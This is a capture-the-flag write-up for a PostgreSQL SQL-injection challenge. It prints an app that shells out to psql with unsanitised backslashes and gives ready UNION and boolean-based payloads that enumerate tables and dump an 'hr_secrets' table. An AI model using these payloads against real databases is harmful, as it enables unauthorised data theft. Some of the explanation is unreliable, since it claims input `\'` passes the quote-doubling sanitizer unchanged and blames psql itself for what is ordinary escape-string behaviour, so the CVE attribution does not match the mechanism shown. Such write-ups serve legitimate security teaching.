# The Great Escape - Solution Writeup

**Difficulty:** Medium
**Category:** Web / SQL Injection
**Flag:** `Exploit3rs{th3_gr34t_3sc4p3_cve2025}`

---

## Overview

This challenge exploits CVE-2025-1094, a vulnerability in PostgreSQL's `psql` command-line tool where escape sequence handling can bypass standard SQL injection protections. The application sanitizes single quotes by doubling them (`'` -> `''`), but the psql client mishandles escape sequences like `\'`, allowing attackers to break out of string literals.

## Vulnerability Analysis

### The Vulnerable Code Pattern

```python
def sanitize_input(user_input):
    return user_input.replace("'", "''")

psql_cmd = (
    f'psql -h {host} -U {user} -d {db} '
    f"-c \"SET standard_conforming_strings=off; SELECT * FROM employees WHERE name ILIKE E'%{sanitized}%'\""
)
subprocess.run(psql_cmd, shell=True, ...)
```

The application uses PostgreSQL escape strings (`E'...'`) with `standard_conforming_strings=off`, which means backslash sequences like `\'` are interpreted as escape sequences.

### Why Standard Injection Fails

When a user inputs `' OR 1=1--`, the application transforms it to:
```
'' OR 1=1--
```

This results in a valid SQL string that doesn't break out of the quotes.

### The Bypass: Escape Sequence Injection

The key insight is that `psql` interprets escape sequences differently than the application expects.

When a user inputs `\'`, the application sees:
- A backslash followed by a single quote
- Since there's no standalone `'`, no escaping is applied
- The input passes through unchanged as `\'`

When `psql` processes this:
- In certain contexts, `\'` is interpreted as an escaped literal quote
- This causes the string delimiter to be consumed incorrectly
- The subsequent characters break out of the string context

## Step-by-Step Exploitation

### Step 1: Reconnaissance

Visit the application and observe:
- Professional HR employee directory search
- Footer reveals: "PostgreSQL 16.6 | psql CLI Backend"
- Page description mentions "command-line database interface"

### Step 2: Test Standard Injection

Input: `' OR 1=1--`

Result: No injection - quotes are properly escaped

### Step 3: Test Escape Sequence Bypass

Input: `\' OR 1=1--`

Result: Query behaves differently, indicating successful injection

### Step 4: Enumerate Tables

To discover the `hr_secrets` table, use UNION-based injection:

**Payload to find tables:**
```
\' UNION SELECT 1,table_name,table_schema,table_type,table_catalog FROM information_schema.tables WHERE table_schema='public'--
```

This reveals:
- `employees` table
- `hr_secrets` table

### Step 5: Enumerate Columns

**Payload to find columns in hr_secrets:**
```
\' UNION SELECT 1,column_name,data_type,table_name,ordinal_position::text FROM information_schema.columns WHERE table_name='hr_secrets'--
```

This reveals columns:
- `id`
- `key`
- `value`
- `classification`
- `created_at`

### Step 6: Extract the Flag

**Final payload:**
```
\' UNION SELECT id,key,value,classification,created_at::text FROM hr_secrets--
```

This returns all rows from `hr_secrets`, including:
```
1 | admin_flag | Exploit3rs{th3_gr34t_3sc4p3_cve2025} | TOP SECRET
```

## Alternative Payloads

### Direct Flag Extraction
```
\' UNION SELECT 1,value,'x','y','z' FROM hr_secrets WHERE key='admin_flag'--
```

### Using CONCAT for cleaner output
```
\' UNION SELECT 1,CONCAT(key,':',value),'a','b','c' FROM hr_secrets--
```

### Boolean-based (if UNION is filtered)
```
\' AND (SELECT CASE WHEN (SELECT value FROM hr_secrets WHERE key='admin_flag') LIKE 'Exploit3rs%' THEN 1 ELSE 1/0 END)=1--
```

## Technical Details

### CVE-2025-1094 Specifics

The vulnerability exists in PostgreSQL versions before:
- 17.3
- 16.7
- 15.11
- 14.16
- 13.19

The issue is in how `psql` handles escape sequences in certain string processing scenarios. When the application performs quote escaping but passes the result to psql via shell command, the escape sequence `\'` can cause unexpected parsing behavior.

### Why This Works

1. The application sanitizes `'` to `''` but doesn't consider `\'`
2. The backslash-quote sequence `\'` is not modified
3. When psql parses the command, it may interpret `\'` as an escape sequence
4. This causes the string terminator to be misaligned
5. Subsequent SQL after the `\'` is executed as code, not data

### Affected Scenarios

This vulnerability specifically affects applications that:
1. Use the `psql` command-line tool via subprocess/shell execution
2. Implement quote escaping but not backslash handling
3. Construct SQL queries with user input embedded in strings

## Mitigation

1. **Update PostgreSQL** to version 16.7 or later
2. **Use parameterized queries** with proper database drivers (psycopg2, etc.)
3. **Avoid shelling out** to psql for database operations
4. **Escape backslashes** in addition to quotes
5. **Use allowlist validation** for user input when possible

## Flag

```
Exploit3rs{th3_gr34t_3sc4p3_cve2025}
```
